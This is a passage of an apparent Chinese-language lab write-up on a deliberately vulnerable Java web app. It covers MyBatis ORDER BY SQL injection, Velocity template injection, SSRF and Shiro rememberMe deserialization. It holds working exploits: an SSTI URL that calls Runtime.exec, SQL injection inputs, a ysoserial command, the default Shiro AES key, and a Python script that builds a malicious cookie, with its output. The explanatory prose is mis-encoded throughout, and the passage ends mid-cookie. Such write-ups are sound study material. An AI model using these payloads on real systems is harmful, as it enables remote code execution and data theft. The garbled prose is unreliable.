class="hljs-string">&quot;User&quot;</span>&gt;</span><br>       select * from users<br>       <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;order != null&quot;</span>&gt;</span><br>           order by $&#123;order&#125; asc<br>       <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ORDER BY æ‹¼æ¥æ’åºå­—æ®µ</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli/mybatis/orderby/vuln03?sort=id <span class="hljs-keyword">desc</span><span class="hljs-comment">--+</span><br>-&gt;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id <span class="hljs-keyword">desc</span><span class="hljs-comment">--+ asc</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940380.png" alt="20250725134556658"></p><h3 id="7-mybatis-sec01"><a href="#7-mybatis-sec01" class="headerlink" title="7.&#x2F;mybatis&#x2F;sec01"></a>7.&#x2F;mybatis&#x2F;sec01</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/sec01&quot;)</span><br><span class="hljs-keyword">public</span> User <span class="hljs-title function_">mybatisSec01</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.findByUserName(username);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)</span><br>User <span class="hljs-title function_">findByUserName</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span>;<br></code></pre></td></tr></table></figure><h3 id="8-mybatis-sec02"><a href="#8-mybatis-sec02" class="headerlink" title="8.&#x2F;mybatis&#x2F;sec02"></a>8.&#x2F;mybatis&#x2F;sec02</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/sec02&quot;)</span><br><span class="hljs-keyword">public</span> User <span class="hljs-title function_">mybatisSec02</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;id&quot;)</span> Integer id)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.findById(id);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">User <span class="hljs-title function_">findById</span><span class="hljs-params">(Integer id)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findById&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from users where id = #&#123;id&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="9-mybatis-sec03"><a href="#9-mybatis-sec03" class="headerlink" title="9.&#x2F;mybatis&#x2F;sec03"></a>9.&#x2F;mybatis&#x2F;sec03</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/sec03&quot;)</span><br><span class="hljs-keyword">public</span> User <span class="hljs-title function_">mybatisSec03</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.OrderByUsername();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">User <span class="hljs-title function_">OrderByUsername</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;OrderByUsername&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from users order by id asc limit 1<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="10-mybatis-orderby-sec04"><a href="#10-mybatis-orderby-sec04" class="headerlink" title="10.&#x2F;mybatis&#x2F;orderby&#x2F;sec04"></a>10.&#x2F;mybatis&#x2F;orderby&#x2F;sec04</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/orderby/sec04&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisOrderBySec04</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln03(SecurityUtil.sqlFilter(sort));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln03</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;order&quot;)</span> String order)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln03&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from users<br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;order != null&quot;</span>&gt;</span><br>        order by $&#123;order&#125; asc<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTIï¼ˆServer-Side Template Injectionï¼‰å°±æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941162.png" alt="20250726105655246"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/velocity&quot;)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">velocity</span><span class="hljs-params">(String template)</span> &#123;<br>       Velocity.init();<br><br>       <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br><br>       context.put(<span class="hljs-string">&quot;author&quot;</span>, <span class="hljs-string">&quot;Elliot A.&quot;</span>);<br>       context.put(<span class="hljs-string">&quot;address&quot;</span>, <span class="hljs-string">&quot;217 E Broadway&quot;</span>);<br>       context.put(<span class="hljs-string">&quot;phone&quot;</span>, <span class="hljs-string">&quot;555-1337&quot;</span>);<br><br>       <span class="hljs-comment">//å¯¹ç”¨æˆ·ä¼ å…¥çš„ template æ— è¿‡æ»¤ç›´æ¥ä¼ å…¥ Velocity.evaluate æ‰§è¡Œï¼Œ</span><br>       <span class="hljs-type">StringWriter</span> <span class="hljs-variable">swOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>       Velocity.evaluate(context, swOut, <span class="hljs-string">&quot;test&quot;</span>, template);<br>   &#125;<br></code></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/ssti/velocity?template=#set($e=<span class="hljs-string">&quot;e&quot;</span>);$e.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,null).invoke(null,null).exec(<span class="hljs-string">&quot;calc.exe&quot;</span>)<br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/ssti/velocity?template=%<span class="hljs-number">23</span>set($e=%<span class="hljs-number">22</span>e%<span class="hljs-number">22</span>);$e.getClass().forName(%<span class="hljs-number">22</span>java.lang.Runtime%<span class="hljs-number">22</span>).getMethod(%<span class="hljs-number">22</span>getRuntime%<span class="hljs-number">22</span>,null).invoke(null,null).exec(%<span class="hljs-number">22</span>calc.exe%<span class="hljs-number">22</span>)<br><br></code></pre></td></tr></table></figure><ol><li><code>#set($e=&quot;e&quot;)</code></li></ol><p>Velocity æ¨¡æ¿è¯­è¨€ä¸­çš„å˜é‡å®šä¹‰ã€‚åˆ›å»ºä¸€ä¸ªå˜é‡ <code>$e</code>ï¼Œå€¼ä¸ºå­—ç¬¦ä¸² <code>&quot;e&quot;</code>ã€‚åé¢æˆ‘ä»¬ä¼šç”¨ <code>$e.getClass()</code> æ¥è·å–å®ƒçš„ <code>Class</code> å¯¹è±¡ï¼Œä»è€Œè¿›å…¥ Java åå°„</p><ol start="2"><li><code>$e.getClass()</code></li></ol><p><code>$e</code> æ˜¯å­—ç¬¦ä¸² <code>&quot;e&quot;</code>ï¼Œè°ƒç”¨ <code>.getClass()</code> å¾—åˆ°çš„æ˜¯ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">java.lang.<span class="hljs-type">String</span>.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°äº† <code>Class&lt;java.lang.String&gt;</code>ï¼Œå¯ä»¥è°ƒç”¨å…¶ <code>forName()</code> é™æ€æ–¹æ³•</p><ol start="3"><li><code>.forName(&quot;java.lang.Runtime&quot;)</code></li></ol><p>é€šè¿‡åå°„åŠ è½½ <code>java.lang.Runtime</code> ç±»ï¼š</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br></code></pre></td></tr></table></figure><p>è¿”å› <code>java.lang.Runtime.class</code>ï¼Œå¯ä»¥ç»§ç»­è°ƒç”¨å®ƒçš„æ–¹æ³•</p><ol start="4"><li><code>.getMethod(&quot;getRuntime&quot;, null)</code></li></ol><p>è·å– <code>Runtime</code> ç±»çš„é™æ€æ–¹æ³• <code>getRuntime()</code>ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span>.<span class="hljs-keyword">class</span>.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>)<br></code></pre></td></tr></table></figure><p><code>getMethod()</code> è¿”å›ä¸€ä¸ª <code>Method</code> å¯¹è±¡ï¼Œå‡†å¤‡æ‰§è¡Œå®ƒ</p><ol start="5"><li><code>.invoke(null, null)</code></li></ol><p>æ‰§è¡Œé™æ€æ–¹æ³• <code>getRuntime()</code>ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span>.getRuntime()<br></code></pre></td></tr></table></figure><p>å¾—åˆ°äº†å½“å‰ JVM çš„ <code>Runtime</code> å®ä¾‹ï¼Œå…·å¤‡æ‰§è¡Œå‘½ä»¤çš„èƒ½åŠ›</p><ol start="6"><li><code>.exec(&quot;calc.exe&quot;)</code></li></ol><p>æœ€ç»ˆæ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>)<br></code></pre></td></tr></table></figure><p>åœ¨ Windows ä¸Šï¼Œæ‰“å¼€è®¡ç®—å™¨</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941658.png" alt="20250726105045484"></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><blockquote><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰</p><p>SSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚</p><p><img src="https://gitee.com/xvshifu/pic-go/raw/master/img/20250726112359849.png" alt="image-20250726112359793"></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/urlConnection/vuln&quot;, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">URLConnectionVuln</span><span class="hljs-params">(String url)</span> &#123;<br>    <span class="hljs-keyword">return</span> HttpUtils.URLConnection(url);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">URLConnection</span><span class="hljs-params">(String url)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//æ²¡æœ‰æ ¡éªŒåè®®å’Œä¸»æœºï¼Œå¯¹ä»»æ„åè®®éƒ½å¯ä»¥è®¿é—®</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>        <span class="hljs-type">URLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> u.openConnection();<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(urlConnection.getInputStream())); <span class="hljs-comment">//send request</span><br>        String inputLine;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">html</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">while</span> ((inputLine = in.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            html.append(inputLine);<br>        &#125;<br>        in.close();<br>        <span class="hljs-keyword">return</span> html.toString();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.getMessage());<br>        <span class="hljs-keyword">return</span> e.getMessage();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/ssrf/urlConnection/vuln</span>?url=file:<span class="hljs-string">/D</span>:<span class="hljs-string">/1.txt</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941099.png" alt="20250726112949883"></p><h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(value = &quot;/shiro/deserialize&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">shiro_deserialize</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse res)</span> &#123;<br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(req, Constants.REMEMBER_ME_COOKIE);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] b64DecodeRememberMe = java.util.Base64.getDecoder().decode(rememberMe);<br>        <span class="hljs-type">byte</span>[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(aesDecrypt);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytes);<br>        in.readObject();<br>        in.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        <span class="hljs-keyword">if</span> (CookieUtils.addCookie(res, <span class="hljs-string">&quot;rememberMe&quot;</span>, DELETE_ME))&#123;<br>            log.error(e.getMessage());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;RememberMe cookie decrypt error. Set deleteMe cookie success.&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Shiro deserialize&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Shiro  <code>rememberMe</code> åŠŸèƒ½ç”¨äºâ€œè®°ä½ç™»å½•çŠ¶æ€â€ã€‚å®ƒçš„è®¾è®¡é€»è¾‘æ˜¯ï¼š</p><p>ç”¨æˆ·å‹¾é€‰â€œè®°ä½æˆ‘â€ç™»å½•åï¼ŒShiro æŠŠç”¨æˆ·çš„è®¤è¯ä¿¡æ¯<strong>åºåˆ—åŒ–ä¸ºå­—èŠ‚æµ</strong>ï¼Œç”¨ä¸€ä¸ªå›ºå®šå¯†é’¥ï¼ˆé»˜è®¤æ˜¯ <code>kPH+bIxk5D2deZiIxcaaaA==</code>ï¼‰ç”¨ AES åŠ å¯†ï¼ŒBase64 ç¼–ç åä½œä¸º <code>rememberMe</code> Cookie å‘é€ç»™æµè§ˆå™¨ã€‚å½“æµè§ˆå™¨ä¸‹æ¬¡è¯·æ±‚æ—¶ï¼ŒShiroï¼šè¯»å– <code>rememberMe</code> Cookieï¼Œç”¨åŒæ ·çš„å¯†é’¥è¿›è¡Œè§£å¯†ï¼Œç„¶å<strong>ç›´æ¥ååºåˆ—åŒ–</strong>å‡ºç”¨æˆ·å¯¹è±¡ï¼Œåªè¦æ”»å‡»è€…èƒ½æ§åˆ¶ <code>rememberMe</code> Cookie å†…å®¹ï¼Œ<strong>å°±èƒ½æ„é€ æ¶æ„å¯¹è±¡ååºåˆ—åŒ–ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</strong></p><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><p>ç”Ÿæˆæ¶æ„åºåˆ—åŒ–æ•°æ®</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial.<span class="hljs-keyword">jar </span>CommonsBeanutils1 <span class="hljs-string">&quot;calc.exe&quot;</span> &gt; payload.<span class="hljs-keyword">bin</span><br></code></pre></td></tr></table></figure><p>åŠ å¯† Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Shiro é»˜è®¤å¯†é’¥</span><br>key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br><br><span class="hljs-comment"># è¯»å– payload</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\\CTF-Tools\\ysoserial-master\\target\\payload.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    payload = f.read()<br><br><span class="hljs-comment"># è¡¥é½ä¸º 16 çš„å€æ•° (PKCS5Padding)</span><br>pad = <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(payload) % <span class="hljs-number">16</span><br>payload += <span class="hljs-built_in">bytes</span>([pad] * pad)<br><br><span class="hljs-comment"># AES-CBC åŠ å¯† (IV éšæœºç”Ÿæˆ)</span><br>iv = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">16</span>  <span class="hljs-comment"># å®é™…æ”»å‡»éœ€éšæœº IV</span><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>encrypted = cipher.encrypt(payload)<br><br><span class="hljs-comment"># Base64 ç¼–ç </span><br>rememberMe = base64.b64encode(iv + encrypted).decode()  <span class="hljs-comment"># Shiro æ ¼å¼: IV+å¯†æ–‡</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ¶æ„ Cookie:&quot;</span>, rememberMe)<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">æ¶æ„ Cookie: <br>AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/g</span>dRfw9LcryTLP6L34t9wsvsXnBU1VSf5hQbAnLNK8U6tmS8mE71BGg5DVxXjdaZ2Sktj6pGhYmrmySrHqvTuDxmZF+EgIA+g0SQMeALpCzmRK4j4Lmn3JQAqEAhglphaTt+<span class="hljs-number">2</span>UB7rzvNBVbUGHx72GSISDEQiCBRjyufA+sziQUFYCP6DjWEjYOtXKTH+AKulse6AvZXu3Tkybnwa8ZPHPDQGT5b<span class="hljs-regexp">/pNB32K+ftJjsycsFSixp29sAnPqWZQ2c8pOTmznkkXlBdQTDTHtPhGTHntexCFgTHGiqALSXXHWSGmhn8WljmLUFsOLSCgEeWFPZt5uWX78goP5ZDwU/</span>ZYGm5QyIgBBYjjYyuv6nYVZKYbH1A22Iy5sKFjbFXY3YyXWV3hLgmI801jgthjOt5G3iKXhUK557xmEXqe9gZamYVPMxKdIRdiU7fQMPH<span class="hljs-regexp">/7sVd8zAorKWwpoCxU9AedfAZbDFN0I3/g</span>cYI0dAbQg9GyC9jMb5OiDIZE6sFd2XTSWbYQrdnePZe5gPjx8zlntQYl+<span class="hljs-number">7</span>imK4pCFGgBIqX+<span class="hljs-number">1</span>G0O0GvRIBoWUadk5KK8lm9J3aXjtfo25hFu6DnnPnDyRQnudEdQLjNqYpiIxJtNw<span class="hljs-regexp">/W0VgEmjpG2OsLRtsCRddr8/</span>Vky+<span class="hljs-number">6</span>t5i76oEqDU8iPh<span class="hljs-regexp">/Stjj9OfjfSNroe3B5Nbzzh1e0KWVoTPoNRc4d3THTBcaNeK3YnyTN3Ws+88WBG7vbFZF9Fj5GdksjEYcmRDnWbukoLJJH0diWwXT7cSKOdKqAsFQr0meXhGWvMAN1EP74/</span>zvbXM<span class="hljs-regexp">/RpZZlefSQpfeh29D2wxaqdP2ydMTo+qixxTIIEspf4EFI3/</span>vO+kPojn<span class="hljs-regexp">/GA+H38ovGW6reqxHXooV655jmV155px5BFR/</span>MvklhgGyiSPVNoPL567alnOsfhd2R2h3<span class="hljs-regexp">/6VZv04uwu4p4dLa13EL9l+PEOXETpbLQEYmln707qD3+mx+lUD8HHusPJfVtI6CZPzceIdq/</span>c347uFpGmvZv0fzulV2NuWKS2N5rsBmuUR<span class="hljs-regexp">/+RZR9Pdu65/</span>KYqX85Fw1knJYNJF3wKT<span class="hljs-regexp">/uI8deF+D0b/</span>Ib0rzkHWI2nFWQ24T+Zl1<span class="hljs-regexp">/DsEleOAe8KQaS6mfcbfHyyilY0tFL3dw2TmcFqToSoFeuJEGsAiRjM+1bp5TqJmfKUcnbDqLK4ybs+IlUh1ESSTFBiE7soFo9vytcu1l1Q4YL3OwbTLci2CpaugEF6ehkJrQ0a2JlTDScqxVGtkkT13p9+b5XShyLT83rSoVbQWfQuaWw0EIfaz295IzGjmo8F46mo2EJIB0HXbSiRusBU7x4xLgpjvZ5G8c7GkQNOfx96gGHYy6k+yoWcSKWWuKq7SVqgI8bKSDrGT25Ko8dPGpTYjQ5YyVw3PA2AU8VqdaUMWINPNMm5Aoi/</span>AgzKBPup2b+<span class="hljs-number">3</span>V618KprP6u029vuQoW9VysdJCsmA3MyCqQFvCGpaK0KbKWo+<span 